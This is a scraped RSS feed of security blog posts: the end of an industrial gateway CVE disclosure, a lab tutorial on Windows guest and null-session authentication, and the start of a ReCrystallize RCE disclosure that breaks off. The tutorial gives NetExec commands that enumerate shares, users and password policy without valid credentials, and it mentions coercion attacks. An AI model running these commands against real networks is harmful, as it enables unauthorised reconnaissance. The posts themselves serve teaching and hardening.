themselves, which would at least require to implement the means to disable services from the settings, remove the reboot feature, enable HICP authentication by default and ultimately use a more secure protocol.\nMeasures taken by HMS Networks\nHMS Networks has a well-defined vulnerability disclosure process, it is easy to contact them. They also gave me regular updates on the actions taken in response to the publication, which is appreciated. \nHere is what they decided as a countermeasure: As there is a newer version of this Anybus device (ABC4014-A), the vulnerabilities for this model will not be patched. To address the vulnerabilities, they published a document with guidelines on how to ensure the security of the gateway, published here.\n\n\n\n\nAccording to them, this new model (which I haven’t tested) is not affected by these three vulnerabilities:\nDenial of service on port 7412: The new version uses a completely different hardware and firmware and does not implement the same services on port 7412, therefore the attack is not supposed to work;\nReboot feature on web service: This unauthenticated URL endpoint is apparently not exposed, I have been told that the web service is the only service that can be disabled in this new version;\nHICP protocol: The new version only supports SHICP, not HICP;\nThis decision is quite understandable, especially considering that CVE-2024-23765 cannot be patched without replacing the hardware and that CVE-2024-23767 requires replacing the main protocol used for configuration (which has already be done in newer versions). Nevertheless, there are a few things we can discuss.\nFirst, a remediation which consists the replacement of devices to enhance cybersecurity is difficult to accept, especially considering that devices are likely to stay longer and to be more difficult to replace in OT than in IT (and they are expensive). Of course, updating devices in industrial systems is also very difficult, but maybe a little less so.\nSecondly, there are many versions of the same Anybus X-Gateway for different translations. My model appears to have a newer version, but this is not true for all models. HMS Networks confirmed that the other “old” models use the same hardware and firmware as the one I tested (e.g. AB7956, CC-Link IE Field Slave – EtherNet/IP Adapter) and that some of them won’t be replaced by the new versions. This means that we will continue to see in industrial systems the Anybus X-Gateway product line prone to these critical vulnerabilities for a long time.\nThere will be some versions that won’t be replaced by the new versions. All the old products are based on a platform that doesn’t have the capabilities to defend against most vulnerabilities, even after updates. For the old products that we will keep and sell, precautions must be taken when installing the product, we will provide guidance in user manuals.\nFinally, the guideline warns about the security of devices interconnected, the device’s physical security, the security of stored data and shows where the gateway must be in a state-of-the-art network architecture, but it does not say anything about network segmentation itself. Yet, it seems to me that the first recommendation we can make, given that we cannot patch or harden the device, is to restrict as much as possible the logical access to these devices from the network.\nWrap up\nYou may have noticed from this article that not all cybersecurity issues related to this device have been published as CVE. Indeed, this model shares the same issues as many industrial devices, as it was not designed with cybersecurity in mind. I could have submitted a vulnerability for the use of insecure IT protocols, one for lack of authentication on the web interface, another for clear-text passwords in the filesystem (I have not mentioned these yet), more for buggy features on the web interface, and so on. But I chose to focus on vulnerabilities that I consider worth talking about.\nAll three vulnerabilities were reported because they can be used to conduct trivial remote attacks to make the device unavailable in industrial environments where availability is critical most of the time:\nOne of the CVE causes crashes, another allows a very simple Denial of Service attack, and two of them can be used to legitimately change the configuration anonymously, which is already enough;\nThey do not require a high level of knowledge to make use of them;\nThey are very easy to uncover, by anyone, as they are all based on the regular usage of legitimate features.\nMoreover, devices such as this one make easy targets: a gateway is a component that is not directly part of the production process and that is likely to be left aside (sometimes even forgotten!) by the maintenance team. This means that it may not be considered for cybersecurity hardening (and it does not provide any features for hardening), and that an attack targeting it may be difficult to investigate if no one knows that this component is a target.\nAt first, I wanted to test this device to find exploitable flaws in the implementation of industrial network protocols. As I made a short stop at these three vulnerabilities, I haven’t done this part yet, and this is my next step. But so far, we don’t even need that to do damage.\nTimeline\nJuly-August 2023: Tests performed.\n2023-09-25: Vulnerability reports sent to HMS Networks.\n2023-09-27 : Acknowledgement.\n2023-10-12 : Notice from HMS Networks: As the gateway AB7832-F replaced by new product ABC4014-A, the mitigation will only consist on a manual supplement to clarify how AB7832-F shall be used to ensure security.\n2024-01-25 : CVE-2024-23765, CVE-2024-23766, CVE-2024-23767 registered.\n2024-02-27 : Document “Anybus Gateway Cybersecurity Guidelines” published on HMS networks.\n2024-06-25 : Technical disclosure.\nSpecial thanks to Fredrik Brynolf (HMS Networks) and Jean-Pascal Thomas (Orange Cyberdefense)",
      "content": "Inside industrial systems (also known as Operational Technology, or OT), devices communicate with each other and can be accessed over IP using familiar IT protocols (such as SSH, web services, etc.), as well as with a variety of industrial network protocols. Among them, you may have heard of Modbus, maybe S7comm, OPC-UA and a few others, but do you know all the industrial protocols you could find on industrial networks? It would take a lifetime to list them all, considering the field-specific standards, the manufacturer-dependent protocols and variations, the association-promoted specifications, and their numerous versions, layers, extensions and adaptations. In the end, an industrial process typically involves a collection of devices, servers and workstations that are likely to use many different protocols and still need to understand each other.\n\n",
      "contentSnippet": "Inside industrial systems (also known as Operational Technology, or OT), devices communicate with each other and can be accessed over IP using familiar IT protocols (such as SSH, web services, etc.), as well as with a variety of industrial network protocols. Among them, you may have heard of Modbus, maybe S7comm, OPC-UA and a few others, but do you know all the industrial protocols you could find on industrial networks? It would take a lifetime to list them all, considering the field-specific standards, the manufacturer-dependent protocols and variations, the association-promoted specifications, and their numerous versions, layers, extensions and adaptations. In the end, an industrial process typically involves a collection of devices, servers and workstations that are likely to use many different protocols and still need to understand each other.",
      "guid": "https://sensepost.com/blog/2024/targeting-an-industrial-protocol-gateway/",
      "isoDate": "2024-05-30T11:19:55.000Z",
      "itunes": {}
    },
    {
      "title": "Guest vs Null session on Windows",
      "link": "https://sensepost.com/blog/2024/guest-vs-null-session-on-windows/",
      "pubDate": "Thu, 18 Apr 2024 19:12:05 +0000",
      "content:encoded": "<p>If you have been doing internal assessments on Active Directory infrastructure you may have heard the following words: &#x201C;Null session&#x201D;, &#x201C;Guest session&#x201D; and &#x201C;Anonymous session&#x201D;. These words describe techniques that can be used on Windows servers to connect to resources and obtain information about a computer or Active Directory objects such as users or SMB shares you have access on. Even if these techniques are well known I realised that people, including myself, didn&#x2019;t understand them completely. This got me wanting to better understand it, hence this blogpost :)!</p>\n\n\n\n<p>In order to illustrate this blogpost I will be using the <a href=\"https://github.com/Orange-Cyberdefense/GOAD\">Game Of Active Directory project</a> developed by the awesome <a href=\"https://twitter.com/M4yFly\">Mayfly</a>. This lab aims at offering a working Active Directory network with multiple domains and vulnerabilities to test. Also, Mayfly wrote some <a href=\"https://mayfly277.github.io/posts/GOADv2-pwning_part1/\">writeups</a> to explain which vulnerability he added and how to exploit them. So if you ever need a vulnerable Active Directory network, take a look at this project ;)!</p>\n\n\n\n<h2 class=\"wp-block-heading\">0/ Guest vs Anonymous vs Null session</h2>\n\n\n\n<p>To begin with, let&#x2019;s clarify one thing. There are only two techniques that can be used:</p>\n\n\n\n<ul>\n<li>Guest authentication which relies on guest accounts</li>\n\n\n\n<li>Null session also known as anonymous authentication which, within Active Directory, relies on a built-in group.</li>\n</ul>\n\n\n\n<p>Now let&#x2019;s fire up Wireshark and have some fun ;)!</p>\n\n\n\n<h2 class=\"wp-block-heading\">I/ Guest authentication</h2>\n\n\n\n<p>Guest authentication is an authentication method that relies on guest accounts. These special accounts are used to give access to a Windows computer (local guest account) or to domain resources (domain guest account) to users who do not have valid credentials but still need to access a computer. As mentioned there are two type of guest accounts:</p>\n\n\n\n<ul>\n<li>Domain guest account</li>\n</ul>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/domain_guest_account.png\"><img loading=\"lazy\" decoding=\"async\" width=\"620\" height=\"481\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/domain_guest_account.png\" alt=\"\" class=\"wp-image-74404\"></a></figure>\n\n\n\n<ul>\n<li>Local guest account</li>\n</ul>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/image-38.png\"><img loading=\"lazy\" decoding=\"async\" width=\"683\" height=\"207\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/image-38.png\" alt=\"\" class=\"wp-image-74435\"></a></figure>\n\n\n\n<p>When connecting to a resource (let&#x2019;s say a SMB share) you will have to specify the username and the password of the account you want to authenticate with. For example with NetExec:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>poetry run netexec smb 192.168.56.11 -u daenarys.targaryen -p &apos;BurnThemAll!&apos; --shares</code></pre>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/basic_smb_authent.png\"><img loading=\"lazy\" decoding=\"async\" width=\"899\" height=\"183\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/basic_smb_authent.png\" alt=\"\" class=\"wp-image-74406\"></a></figure>\n\n\n\n<p>One could say that if you don&#x2019;t have any credentials you cannot authenticate to the SMB service and thus cannot list available shares but that&#x2019;s not true if the guest account of the domain is enabled. You can run the following Netexec command to try list shares using a guest account:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>poetry run netexec smb 192.168.56.11 -u &quot;someaccountthatdoesntexist&quot; -p &quot;&quot; --shares</code></pre>\n\n\n\n<p>And it will work:</p>\n\n\n\n<figure class=\"wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-1 is-layout-flex wp-block-gallery-is-layout-flex\">\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/shouldnt_work.png\"><img loading=\"lazy\" decoding=\"async\" width=\"953\" height=\"188\" data-id=\"74407\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/shouldnt_work.png\" alt=\"\" class=\"wp-image-74407\"></a></figure>\n</figure>\n\n\n\n<p>Question is, why? If we take a look at a packet capture, we can see that Netexec authenticates twice when running the previous command:</p>\n\n\n\n<figure class=\"wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-2 is-layout-flex wp-block-gallery-is-layout-flex\">\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/authentications.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"214\" data-id=\"74408\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/authentications-1024x214.png\" alt=\"\" class=\"wp-image-74408\"></a></figure>\n</figure>\n\n\n\n<p>The first authentication is used by Netexec to determine whether or not SMB signing and SMBv1 are supported. As you can see, no credentials are submitted and we get an error STATUS_ACCESS_DENIED:</p>\n\n\n\n<figure class=\"wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-3 is-layout-flex wp-block-gallery-is-layout-flex\">\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/first_authent.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"81\" data-id=\"74409\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/first_authent-1024x81.png\" alt=\"\" class=\"wp-image-74409\"></a></figure>\n</figure>\n\n\n\n<p>The second authentication is the authentication of the someaccountthatdoesntexist account which doesn&#x2019;t exist within the Active Directory domain. Even if the user doesn&#x2019;t exist we authenticate and connect to the svcctl named pipe which is used by Netexec to determine whether or not the account is local admin:</p>\n\n\n\n<figure class=\"wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-4 is-layout-flex wp-block-gallery-is-layout-flex\">\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/second_authent.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"134\" data-id=\"74410\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/second_authent-1024x134.png\" alt=\"\" class=\"wp-image-74410\"></a></figure>\n</figure>\n\n\n\n<p>But the account doesn&#x2019;t exist so what is the magic trick? Taking a look at the packet received right after sending our NTLMSSP_AUTH packet we can see the following fields:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/authenticated_as_guest.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"411\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/authenticated_as_guest-1024x411.png\" alt=\"\" class=\"wp-image-74411\"></a></figure>\n\n\n\n<p>When we connected as a user that doesn&#x2019;t exist, the server was aware of it so it implicitly falls back to the guest account of the domain. Since this is a valid domain account we were granted access to the resources exposed on the domain without having any credentials! Is accessing SMB shares the worst we can do? Nope! Using this account you can for example launch coercion attacks using, for example, printerbug:</p>\n\n\n\n<figure class=\"wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-5 is-layout-flex wp-block-gallery-is-layout-flex\">\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/coerce_via_guest.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"516\" data-id=\"74412\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/coerce_via_guest-1024x516.png\" alt=\"\" class=\"wp-image-74412\"></a></figure>\n</figure>\n\n\n\n<p>Now let&#x2019;s disable the domain guest account to prevent guest authentication:</p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/disable_domain_guest_account.png\"><img loading=\"lazy\" decoding=\"async\" width=\"605\" height=\"290\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/disable_domain_guest_account.png\" alt=\"\" class=\"wp-image-74413\" style=\"width:610px;height:auto\"></a></figure>\n\n\n\n<p>And run the following command once again:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>poetry run netexec smb 192.168.56.11 -u &quot;someaccountthatdoesntexist&quot; -p &quot;&quot; --shares</code></pre>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/shouldnt_work-1.png\"><img loading=\"lazy\" decoding=\"async\" width=\"953\" height=\"188\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/shouldnt_work-1.png\" alt=\"\" class=\"wp-image-74414\"></a></figure>\n\n\n\n<p>As you can see it still works? Know why? Because on the BRAAVOS server, the local guest account is still enabled:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/local_guest_account_enabled.png\"><img loading=\"lazy\" decoding=\"async\" width=\"673\" height=\"336\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/local_guest_account_enabled.png\" alt=\"\" class=\"wp-image-74415\"></a></figure>\n\n\n\n<p>Disabling this account will prevent us from authenticating as a guest and thus prevent us from accessing the SMB shares:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/is_safe.png\"><img loading=\"lazy\" decoding=\"async\" width=\"963\" height=\"58\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/is_safe.png\" alt=\"\" class=\"wp-image-74416\"></a></figure>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\">\n\n\n\n<p>Side note, you may have seen that the guest users have READ/WRITE access on the &#x201C;all&#x201D; share:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/readwrite.png\"><img loading=\"lazy\" decoding=\"async\" width=\"536\" height=\"165\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/readwrite.png\" alt=\"\" class=\"wp-image-74417\"></a></figure>\n\n\n\n<p>That&#x2019;s because on the GOAD lab, the &#x201C;all&#x201D; share is configured to be accessible with READ/WRITE using the following rule which affects the &#x201C;Everyone&#x201D; group:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/everyone.png\"><img loading=\"lazy\" decoding=\"async\" width=\"538\" height=\"414\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/everyone.png\" alt=\"\" class=\"wp-image-74418\"></a></figure>\n\n\n\n<p>And since I have been wondering what&#x2019;s the difference between the &#x201C;Everyone&#x201D; group and the &#x201C;Authenticated Users&#x201D; group, here is the response: the &#x201C;Authenticated users&#x201D; group includes users that authenticated via a valid username and password while the &#x201C;Everyone&#x201D; contains both the authenticated users and the guest user.</p>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\">\n\n\n\n<p>Now that we have disabled both the domain guest account and the local guest accounts, can we consider that we are safe ? Not entirely.</p>\n\n\n\n<h2 class=\"wp-block-heading\">II/ Null session / anonymous authentication</h2>\n\n\n\n<p>Null session, also known as anonymous authentication, is a special kind of authentication during which the user doesn&#x2019;t submit any credentials. When a user connects via a null session, he connects as a member of the &#x201C;Anonymous Logon&#x201D; group and inherits all ACL&#x2019;s assigned to this group. You can launch a null session authentication using the following commands with Netexec:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>poetry run netexec smb 192.168.56.11 -u &apos;&apos; -p &apos;&apos; --users\npoetry run netexec smb 192.168.56.11 --users</code></pre>\n\n\n\n<p>These are the same and will allow you to list domain users, if successful:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/null_authent_users.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"186\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/null_authent_users-1024x186.png\" alt=\"\" class=\"wp-image-74419\"></a></figure>\n\n\n\n<p>But why does it work? In older versions of Windows, null sessions were used for various network operations in order to establish connections to servers without providing credentials. At some point Microsoft dropped the null session capability for security purposes but, for backward compatibility, they created a group which allows its members to authenticate via a null session. This group is called &#x201C;Pre-Windows 2000 Compatible Access&#x201D; and is a built-in group in Active Directory:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/builtin_group.png\"><img loading=\"lazy\" decoding=\"async\" width=\"628\" height=\"402\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/builtin_group.png\" alt=\"\" class=\"wp-image-74420\"></a></figure>\n\n\n\n<p>The thing is, this group has got special permissions over the domain which we can list here:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/special_permissions.png\"><img loading=\"lazy\" decoding=\"async\" width=\"592\" height=\"603\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/special_permissions.png\" alt=\"\" class=\"wp-image-74421\"></a></figure>\n\n\n\n<p>These permissions allow a member of the &#x201C;Pre-Windows 2000 Compatible Access&#x201D; to remotely call the SAMR named pipe in order to list domain users, their descriptions, their badpwd number, and even the password policy.</p>\n\n\n\n<p>This is the reason why we can launch the following commands and get results from a null session authentication:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>poetry run netexec smb 192.168.56.11 --users\npoetry run netexec smb 192.168.56.11 --pass-pol</code></pre>\n\n\n\n<p>But interestingly enough, if we take a look at the members of the &#x201C;Pre-Windows 2000 Compatible Access&#x201D; on WINTERFELL we will see that it doesn&#x2019;t contain the &#x201C;Anonymous Logon&#x201D; group:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/empty_pre.png\"><img loading=\"lazy\" decoding=\"async\" width=\"616\" height=\"275\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/empty_pre.png\" alt=\"\" class=\"wp-image-74422\"></a></figure>\n\n\n\n<p>Wait, did you expect Mayfly to blindly add the &#x201C;Anonymous Logon&#x201D; group to the &#x201C;Pre-Windows 2000 Compatibility Access&#x201D; group ? Nah this guy knows more than enough on what he is doing, instead he simply added the necessary permissions to the &#x201C;Anonymous Logon&#x201D; group directly:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/thank_you_mayfly_for_the_insane_lab.png\"><img loading=\"lazy\" decoding=\"async\" width=\"629\" height=\"348\" src=\"https://sensepost.com/img/pages/blog/2024/guest-vs-null-session-on-windows/thank_you_mayfly_for_the_insane_lab.png\" alt=\"\" class=\"wp-image-74423\"></a></figure>\n\n\n\n<p>And that is why we can call the remote SAMR named pipe!</p>\n\n\n\n<h2 class=\"wp-block-heading\">III/ Final words</h2>\n\n\n\n<p>Final words:</p>\n\n\n\n<ul>\n<li>Disable all guest accounts whether it is the domain guest account or the local guest accounts</li>\n\n\n\n<li>Check the permissions of the &#x201C;Anonymous Logon&#x201D; group on your domain and restrict them as much as you can</li>\n</ul>\n\n\n\n<p>This will protect your domain against all we have seen during this blog ;)! </p>\n\n\n\n<p>Happy hacking!</p>\n\n\n\n<p>This is a cross-post blog from https://blog.whiteflag.io/blog/null-vs-guest-vs-anonymous-sessions/.</p>\n",
      "content:encodedSnippet": "If you have been doing internal assessments on Active Directory infrastructure you may have heard the following words: “Null session”, “Guest session” and “Anonymous session”. These words describe techniques that can be used on Windows servers to connect to resources and obtain information about a computer or Active Directory objects such as users or SMB shares you have access on. Even if these techniques are well known I realised that people, including myself, didn’t understand them completely. This got me wanting to better understand it, hence this blogpost :)!\nIn order to illustrate this blogpost I will be using the Game Of Active Directory project developed by the awesome Mayfly. This lab aims at offering a working Active Directory network with multiple domains and vulnerabilities to test. Also, Mayfly wrote some writeups to explain which vulnerability he added and how to exploit them. So if you ever need a vulnerable Active Directory network, take a look at this project ;)!\n0/ Guest vs Anonymous vs Null session\nTo begin with, let’s clarify one thing. There are only two techniques that can be used:\nGuest authentication which relies on guest accounts\nNull session also known as anonymous authentication which, within Active Directory, relies on a built-in group.\nNow let’s fire up Wireshark and have some fun ;)!\nI/ Guest authentication\nGuest authentication is an authentication method that relies on guest accounts. These special accounts are used to give access to a Windows computer (local guest account) or to domain resources (domain guest account) to users who do not have valid credentials but still need to access a computer. As mentioned there are two type of guest accounts:\nDomain guest account\n\n\n\n\n\nLocal guest account\n\n\n\n\nWhen connecting to a resource (let’s say a SMB share) you will have to specify the username and the password of the account you want to authenticate with. For example with NetExec:\npoetry run netexec smb 192.168.56.11 -u daenarys.targaryen -p 'BurnThemAll!' --shares\n\n\n\n\nOne could say that if you don’t have any credentials you cannot authenticate to the SMB service and thus cannot list available shares but that’s not true if the guest account of the domain is enabled. You can run the following Netexec command to try list shares using a guest account:\npoetry run netexec smb 192.168.56.11 -u \"someaccountthatdoesntexist\" -p \"\" --shares\nAnd it will work:\n\n\n\n\n\nQuestion is, why? If we take a look at a packet capture, we can see that Netexec authenticates twice when running the previous command:\n\n\n\n\n\nThe first authentication is used by Netexec to determine whether or not SMB signing and SMBv1 are supported. As you can see, no credentials are submitted and we get an error STATUS_ACCESS_DENIED:\n\n\n\n\n\nThe second authentication is the authentication of the someaccountthatdoesntexist account which doesn’t exist within the Active Directory domain. Even if the user doesn’t exist we authenticate and connect to the svcctl named pipe which is used by Netexec to determine whether or not the account is local admin:\n\n\n\n\n\nBut the account doesn’t exist so what is the magic trick? Taking a look at the packet received right after sending our NTLMSSP_AUTH packet we can see the following fields:\n\n\n\n\nWhen we connected as a user that doesn’t exist, the server was aware of it so it implicitly falls back to the guest account of the domain. Since this is a valid domain account we were granted access to the resources exposed on the domain without having any credentials! Is accessing SMB shares the worst we can do? Nope! Using this account you can for example launch coercion attacks using, for example, printerbug:\n\n\n\n\n\nNow let’s disable the domain guest account to prevent guest authentication:\n\n\n\n\nAnd run the following command once again:\npoetry run netexec smb 192.168.56.11 -u \"someaccountthatdoesntexist\" -p \"\" --shares\n\n\n\n\nAs you can see it still works? Know why? Because on the BRAAVOS server, the local guest account is still enabled:\n\n\n\n\nDisabling this account will prevent us from authenticating as a guest and thus prevent us from accessing the SMB shares:\n\n\n\n\n\n\n\n\nSide note, you may have seen that the guest users have READ/WRITE access on the “all” share:\n\n\n\n\nThat’s because on the GOAD lab, the “all” share is configured to be accessible with READ/WRITE using the following rule which affects the “Everyone” group:\n\n\n\n\nAnd since I have been wondering what’s the difference between the “Everyone” group and the “Authenticated Users” group, here is the response: the “Authenticated users” group includes users that authenticated via a valid username and password while the “Everyone” contains both the authenticated users and the guest user.\nNow that we have disabled both the domain guest account and the local guest accounts, can we consider that we are safe ? Not entirely.\nII/ Null session / anonymous authentication\nNull session, also known as anonymous authentication, is a special kind of authentication during which the user doesn’t submit any credentials. When a user connects via a null session, he connects as a member of the “Anonymous Logon” group and inherits all ACL’s assigned to this group. You can launch a null session authentication using the following commands with Netexec:\npoetry run netexec smb 192.168.56.11 -u '' -p '' --users\npoetry run netexec smb 192.168.56.11 --users\nThese are the same and will allow you to list domain users, if successful:\n\n\n\n\nBut why does it work? In older versions of Windows, null sessions were used for various network operations in order to establish connections to servers without providing credentials. At some point Microsoft dropped the null session capability for security purposes but, for backward compatibility, they created a group which allows its members to authenticate via a null session. This group is called “Pre-Windows 2000 Compatible Access” and is a built-in group in Active Directory:\n\n\n\n\nThe thing is, this group has got special permissions over the domain which we can list here:\n\n\n\n\nThese permissions allow a member of the “Pre-Windows 2000 Compatible Access” to remotely call the SAMR named pipe in order to list domain users, their descriptions, their badpwd number, and even the password policy.\nThis is the reason why we can launch the following commands and get results from a null session authentication:\npoetry run netexec smb 192.168.56.11 --users\npoetry run netexec smb 192.168.56.11 --pass-pol\nBut interestingly enough, if we take a look at the members of the “Pre-Windows 2000 Compatible Access” on WINTERFELL we will see that it doesn’t contain the “Anonymous Logon” group:\n\n\n\n\nWait, did you expect Mayfly to blindly add the “Anonymous Logon” group to the “Pre-Windows 2000 Compatibility Access” group ? Nah this guy knows more than enough on what he is doing, instead he simply added the necessary permissions to the “Anonymous Logon” group directly:\n\n\n\n\nAnd that is why we can call the remote SAMR named pipe!\nIII/ Final words\nFinal words:\nDisable all guest accounts whether it is the domain guest account or the local guest accounts\nCheck the permissions of the “Anonymous Logon” group on your domain and restrict them as much as you can\nThis will protect your domain against all we have seen during this blog ;)! \nHappy hacking!\nThis is a cross-post blog from https://blog.whiteflag.io/blog/null-vs-guest-vs-anonymous-sessions/.",
      "content": "If you have been doing internal assessments on Active Directory infrastructure you may have heard the following words: &amp;#x201C;Null session&amp;#x201D;, &amp;#x201C;Guest session&amp;#x201D; and &amp;#x201C;Anonymous session&amp;#x201D;. These words describe techniques that can be used on Windows servers to connect to resources and obtain information about a computer or Active Directory objects such as users or SMB shares you have access on. Even if these techniques are well known I realised that people, including myself, didn&amp;#x2019;t understand them completely. This got me wanting to better understand it, hence this blogpost :)!\n\n",
      "contentSnippet": "If you have been doing internal assessments on Active Directory infrastructure you may have heard the following words: &#x201C;Null session&#x201D;, &#x201C;Guest session&#x201D; and &#x201C;Anonymous session&#x201D;. These words describe techniques that can be used on Windows servers to connect to resources and obtain information about a computer or Active Directory objects such as users or SMB shares you have access on. Even if these techniques are well known I realised that people, including myself, didn&#x2019;t understand them completely. This got me wanting to better understand it, hence this blogpost :)!",
      "guid": "https://sensepost.com/blog/2024/guest-vs-null-session-on-windows/",
      "isoDate": "2024-04-18T19:12:05.000Z",
      "itunes": {}
    },
    {
      "title": "From Discovery to Disclosure: ReCrystallize Server Vulnerabilities",
      "link": "https://sensepost.com/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/",
      "pubDate": "Fri, 22 Mar 2024 07:47:02 +0000",
      "content:encoded": "<p><strong>TL&amp;DR</strong> &#x2013; While on an assessment, I found an instance of ReCrystallize Server. It had many problems, some of which had to do with insufficient hardening on the client&#x2019;s side while others were new vulnerabilities I found that when chained together, achieve Remote Code Execution (RCE). These vulnerabilities were disclosed to ReCrystallize Software and MITRE.</p>\n\n\n\n<p>Besides the disclosed vulnerabilities, some &#x201C;features&#x201D; were also used for malicious purposes. The replication and validation of the findings were done on my own test environment.</p>\n\n\n\n<p>This blog post was made public despite that there is no patch available (as far as I am aware of) due to a lack of reply from the vendor after multiple interactions.</p>\n\n\n\n<p><strong>Hunting for vulnerabilities</strong></p>\n\n\n\n<p>This blog post tells the tale of finding two vulnerabilities in ReCrystallize Server software. It started with a web application assessment that was not special in any way. The application in scope was meant for internal use only and the core application was kind of boring. This changed when the application threw some errors when I tried to print a report. Looking at the error is where the fun began!</p>\n\n\n\n<p>The error showed that third-party software was used for printing reports. The third-party software was &#x2018;ReCrystallize Server&#x2019; and was a standalone application.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/1.png\"><img loading=\"lazy\" decoding=\"async\" width=\"983\" height=\"309\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/1.png\" alt=\"\" class=\"wp-image-74306\"></a></figure>\n\n\n\n<p>I had never heard of this software before and assumed it had something to do with SAP Crystal Reports. From here, I could follow the road in 2 directions. The one direction was to read the documentation and find known vulnerabilities for this software, and the other direction was to hit the login and see what would happen. My curiosity was triggered, so I just smashed the Log In button.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/2.png\"><img loading=\"lazy\" decoding=\"async\" width=\"998\" height=\"366\" src=\"https://sensepost.com/img/pages/blog/2024/from-discovery-to-disclosure-recrystallize-server-vulnerabilities/2.png\" alt=\"\" class=\"wp-image-74307\"></a></figure>\n\n\n\n<p>Credentials like &#x2018;admin/admin&#x2019; or &#x2018;admin/password&#x2019; did not work, so back to direction number one. Let&#x2019;s look for known vulnerabilities.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a 